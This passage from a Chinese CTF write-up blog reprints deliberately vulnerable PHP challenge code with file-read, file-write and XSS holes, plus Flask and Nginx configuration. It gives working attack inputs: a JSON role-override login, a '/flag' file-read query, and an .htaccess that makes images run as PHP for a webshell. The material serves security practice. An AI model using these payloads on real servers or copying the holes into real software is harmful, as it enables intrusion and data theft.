class="string">&quot;guest&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;123456&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$role</span>;</span><br><span class="line">    <span class="comment">#echo $role;</span></span><br><span class="line">    <span class="comment">#echo json_encode([&quot;status&quot; =&gt; &quot;success&quot;, &quot;message&quot; =&gt; &quot;Login successful&quot;, &quot;user&quot; =&gt; $username]);</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;failed&quot;</span>, <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Invalid username or password&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/secret&quot;</span>), <span class="string">&quot;\r\n&quot;</span>);<span class="comment">// 读取服务器/secret文件的内容，去除末尾的换行符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>] !== <span class="variable">$secret</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);<span class="comment">// 不一致则跳转到登录页</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);<span class="comment">// 不一致则跳转到登录页</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Image Store&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;static/style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">title</span>&quot;&gt;<span class="title">Image</span> <span class="title">Store</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">action</span> = &quot;/&quot; <span class="title">method</span> = &quot;<span class="title">POST</span>&quot; <span class="title">enctype</span> = &quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;//表单提交地址是/（当前页面）</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span> = &quot;<span class="title">file</span>&quot; <span class="title">name</span> = &quot;<span class="title">file</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span> = &quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Upload</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    文件上传模块</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">if</span> ($<span class="title">_SERVER</span>[&quot;<span class="title">REQUEST_METHOD</span>&quot;] == &quot;<span class="title">POST</span>&quot;) </span>&#123;</span><br><span class="line">        <span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">        <span class="comment">//获取文件小写的后缀名</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);<span class="comment">//读取上传文件的临时内容</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);<span class="comment">//获取文件的MIME类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#文件后缀白名单检测，我就不信你还能上传php文件，嘻嘻嘻</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file type not allow&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//强制后缀名尾jpg</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload to ./uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">文件重命名</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$black_list</span>=[<span class="string">&quot;php&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;pht&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>,<span class="variable">$black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我不想看到php文件&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//任意文件读取漏洞</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;怎么没有东西，这我改什么&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fflush</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将内容写入uploads目录的新文件，无路径过滤 → 任意文件写入</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件重命名成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">files</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        // 扫描<span class="title">uploads</span>目录下的所有文件/目录</span></span><br><span class="line"><span class="class">        $<span class="title">files</span> = <span class="title">scandir</span>(&quot;./<span class="title">uploads</span>/&quot;);</span></span><br><span class="line"><span class="class">        <span class="title">foreach</span> ($<span class="title">files</span> <span class="title">as</span> $<span class="title">file</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;./uploads/&#x27;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="comment">//直接将文件输出到html中，xss攻击漏洞</span></span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;a href=<span class="string">&quot;./uploads/&lt;?=<span class="subst">$file</span>?&gt;&quot;</span>&gt;<span class="meta">&lt;?=</span><span class="variable">$file</span><span class="meta">?&gt;</span>&lt;/a&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> &#125;&#125;&#125; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>在login.php中可以看两种post表单提交方式，一种是普通提交username和pasword；一种读取post请求的原始数据并将 JSON 字符串解析为 PHP 关联数组，这种读取存在变量覆盖漏洞。在获取了表单的提交内容之后，得到两种账号密码（guest：123456，admin：456789）<br>但是admin要求本地登录，由于$client_ip &#x3D; $_SERVER[‘REMOTE_ADDR’]已经规定了IP地址，所以没有办法造假，只能用guest。在index.php中要求$_SESSION[‘role’] !&#x3D;&#x3D; ‘admin’，不然还是会跳转到登录页面，而$role &#x3D; “guest”,$_SESSION[‘role’] &#x3D; $role，这时候我们想起了第一种表单提交方式中的变量覆盖漏洞<br><img src="/./img/admin.png" alt="图片"><br>{“username”:”guest”,”password”:”123456”,”role”：”admin”}</li>
+<li>登录后，在index.php中有两个模块（文件上传和文件重命名）。在文件上传中，需要通过白名单检测，并强制将.jpg拼接在路径后。<br>文件重命名中需要通过黑名单检测，存在任意文件读取漏洞和任意文件写入漏洞<br>法一<br>?old_name&#x3D;&#x2F;flag&amp;new_name&#x3D;flag.txt<br><img src="/./img/flag.png" alt="图片"><br>法二<br>上传.htaccess的jpg文件，然后通过改名重新变成.htaccess（注意重命名时要使用服务器中保存到的名字，而不是自己上传的名字</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;456.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>接下来上传456.jpg，同样需要把系统中的名字改成456.jpg,最后用蚁剑连接一下<br><img src="/./img/dd.png" alt="图片"></p>
+<h1 id="眼见不一定为实"><a href="#眼见不一定为实" class="headerlink" title="眼见不一定为实"></a>眼见不一定为实</h1><p>[Nginx路径绕过]<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/18629">https://xz.aliyun.com/news/18629</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"><span class="comment">//指定模板文件（HTML）的存放目录为 templates 文件夹</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/secret&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> os.<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NSSCTF&#123;default&#125;&quot;</span>)</span><br><span class="line"><span class="comment">//os.getenv(&quot;FLAG&quot;)：读取系统环境变量 FLAG 的值</span></span><br><span class="line"><span class="comment">//第二个参数 &quot;NSSCTF&#123;default&#125;&quot;：是「默认值」—— 如果系统中没有 FLAG 环境变量，就返回这个默认字符串；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8080</span>, debug=False)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80; #Nginx监听80端口</span><br><span class="line">    server_name  localhost;   # 绑定域名/主机名为 localhost</span><br><span class="line"></span><br><span class="line">    location ~* ^/secret/?$ &#123;//匹配所有以 /secret 开头、以 /secret 或 /secret/ 结尾的路径，且不区分大小写。</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* ^/secret/ &#123;//匹配所有以 /secret/ 开头的路径（无论结尾是什么），且不区分大小写。</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/./img/85.png" alt="图片"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>cc</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://chq576.github.io/2026/03/11/%E7%8E%84%E6%AD%A6%E6%9D%AF2025/">https://chq576.github.io/2026/03/11/%E7%8E%84%E6%AD%A6%E6%9D%AF2025/</a></p>
+    <p><strong><span class="icon-pencil icon"></span>Title: </strong>「玄武杯2025」</p>
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-11 17:21:46</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-03-14 21:06:25</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap left">
+        
+          
+          
+            <img data-src="/images/cc.jpg" data-sizes="auto" alt="md5" class="lazyload">
+          
+        
+        <a href="/2026/03/13/md5/" aria-label="Prev: md5" title="Prev: md5"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+          
+            md5
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/images/cc.jpg" data-sizes="auto" alt="文件包含" class="lazyload">
+        
+      
+      <a href="/2026/03/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" aria-label="Next: 文件包含"  title="Next: 文件包含"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          文件包含
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="giscus">
+              <span>giscus</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment giscus-comment" data-aos="fade-up"
+          id="giscus-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      cc
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        37.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        03:03
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%94%A6%E5%AE%B6%E6%9C%89%E4%BB%80%E4%B9%88%EF%BC%88ssti%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">锦家有什么（ssti漏洞）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#normal-php"><span class="toc-number">2.</span> <span class="toc-text">normal_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-file"><span class="toc-number">3.</span> <span class="toc-text">ez_file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9C%BC%E8%A7%81%E4%B8%8D%E4%B8%80%E5%AE%9A%E4%B8%BA%E5%AE%9E"><span class="toc-number">4.</span> <span class="toc-text">眼见不一定为实</span></a></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/jn.jpg" data-sizes="auto" alt="cc" class="lazyload">
+  <div class="sidebar-author-name">cc</div>
+  <div class="sidebar-description">章鱼哥喜欢海绵宝宝</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/material-theme@1.0.0/dist/material-theme.umd.js" integrity="sha384-vLev0II0HKFaxkcm+&#x2F;7kX5IGwVFBASkGchU311wmU&#x2F;veIj2bB0UcBkQbW6yw2asK" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "cc",
+          title: "玄武杯2025",
+          url: "https://chq576.github.io/2026/03/11/%E7%8E%84%E6%AD%A6%E6%9D%AF2025/",
